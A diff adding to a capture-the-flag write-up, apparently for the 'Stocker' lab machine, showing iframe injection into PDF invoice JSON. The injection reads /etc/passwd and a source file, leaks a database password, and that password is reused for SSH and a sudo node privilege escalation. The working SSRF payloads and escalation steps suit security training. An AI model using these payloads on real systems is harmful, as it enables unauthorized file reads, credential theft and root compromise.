@@ -196,5 +196,245 @@ Vary: Accept
 
 This indicates the existence of a `/stock` page.
 
+Let's follow the request via burpsuite to `/stock`.
 
+
+### /stock
+
+On this page, we see a "Buy Stock Now!" message. We also have 4 different items, a cup, bin, axe and toilet paper that we can add to the basket.
+
+Inspecting the source, we can find some static javascript code which describes what to do the the items and basket.
+
+WHen adding to the basket and submitting your purchase, you get the option to view a pdf invoice. Perhaps this invoice pdf can be exploited.
+
+Exploring the pdf file information with exiftool..
+
+
+```
+$ exiftool 63f953f42e125849c49fa46d.pdf  
+ExifTool Version Number         : 12.52
+File Name                       : 63f953f42e125849c49fa46d.pdf
+Directory                       : .
+File Size                       : 38 kB
+File Modification Date/Time     : 2023:02:24 19:20:18-05:00
+File Access Date/Time           : 2023:02:24 19:20:33-05:00
+File Inode Change Date/Time     : 2023:02:24 19:20:33-05:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Tagged PDF                      : Yes
+Creator                         : Chromium
+Producer                        : Skia/PDF m108
+Create Date                     : 2023:02:25 00:19:11+00:00
+Modify Date                     : 2023:02:25 00:19:11+00:00
+```
+
+[I found this website](https://www.triskelelabs.com/microstrategy-ssrf-through-pdf-generator-cve-2020-24815) about exploitation of the skia pdf creator. Let's save this for a bit later. First, manual exploitation.
+
+### Manual Exploitation w/ Burp
+
+Using Burp Suite to intercept the traffic, I can see that on submitting a purchase, before the pdf is generated, some readable json data is sent across the wire. Let's try modifying it to include our own data.
+
+Was:
+```
+{
+  "basket":[
+    ({
+      _id: "638f116eeb060210cbd83a8f",
+      title: "Bin",
+      description: "It's a rubbish bin.",
+      image: "bin.jpg",
+      price: 76,
+      currentStock: 15,
+      __v: 0,
+      amount: 1,
+    },
+    {
+      _id: "638f116eeb060210cbd83a8d",
+      title: "Cup",
+      description: "It's a red cup.",
+      image: "red-cup.jpg",
+      price: 32,
+      currentStock: 4,
+      __v: 0,
+      amount: 1,
+    })
+  ];
+}
+```
+
+Now:
+```
+{
+  "basket":[
+    ({
+      _id: "638f116eeb060210cbd83a8f",
+      ***title: "A TOTALLY LEGIT ITEM",***
+      description: "It's a rubbish bin.",
+      image: "bin.jpg",
+      price: 76,
+      currentStock: 15,
+      __v: 0,
+      amount: 1,
+    },
+    {
+      _id: "638f116eeb060210cbd83a8d",
+      title: "Cup",
+      description: "It's a red cup.",
+      image: "red-cup.jpg",
+      price: 32,
+      currentStock: 4,
+      __v: 0,
+      amount: 1,
+    })
+  ];
+}
+```
+
+Now in place of `Bin` the pdf shows `A TOTALLY LEGIT ITEM`!
+We have manipulated the data!
+
+Back to the [link from before](https://www.triskelelabs.com/microstrategy-ssrf-through-pdf-generator-cve-2020-24815).
+
+### SSRF via PDF Generator
+
+The article outlines a SSRF (Server-Side Request Forgery) attack.
+
+Injecting an HTML iframe into the json data as follows, we get a fram displaying the contents of `/etc/passwd`:
+
+```
+{
+  "basket": [
+    {
+      "_id": "638f116eeb060210cbd83a91",
+      ***"title": "<iframe src = \"file:///etc/passwd\" width=1000px height=1000px</iframe>",***
+      "description": "It's an axe.",
+      "image": "axe.jpg",
+      "price": 12,
+      "currentStock": 21,
+      "__v": 0,
+      "amount": 1
+    }
+  ]
+}
+```
+
+This gives us the following information:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
+landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
+angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+
+Therefore we can find that one user is names `angoose`.
+
+Let's try grabbing the `index.js` file from the web server with the `dev` subdomain. Hopefully we can find some useful information about logins there.
+
+Payload:
+```
+"<iframe src = \"file:///var/www/dev/index.js\" width=1000px height=1000px</iframe>"
+```
+
+Returned information:
+```
+...
+// TODO: Configure loading from dotenv for production
+const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
+...
+```
+
+So, we have a username, `angoose` and a password, `IHeardPassphrasesArePrettySecure`.
+
+### SSH
+
+Let's try and login...
+
+```
+$ ssh angoose@10.10.11.196
+password: IHeardPassphrasesArePrettySecure
+```
+
+Exploring:
+```
+$ ls
+user.txt
+```
+
+```
+$ cat user.txt
+bf71238c172e40232ebf206963f00f06
+```
+
+We got our user flag!
+
+
+### Getting root
+
+Running `sudo -l`, we find that we can use `node` with root privileges.
+
+```
+$ sudo -l
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+```
+
+After a quick check, we find that `vim` is avaliable to use.
+Simple! Let's try and write some JavaScript to read the root file.
+
+```
+$ vim
+
+const fs = require('fs');
+
+fs.readFile('/root/root.txt', 'utf8', (err, data) => {
+  if (err) {
+    console.error(err);
+    return;
+  }
+  console.log(data);
+});
+
+:wq hecked.js
+```
 
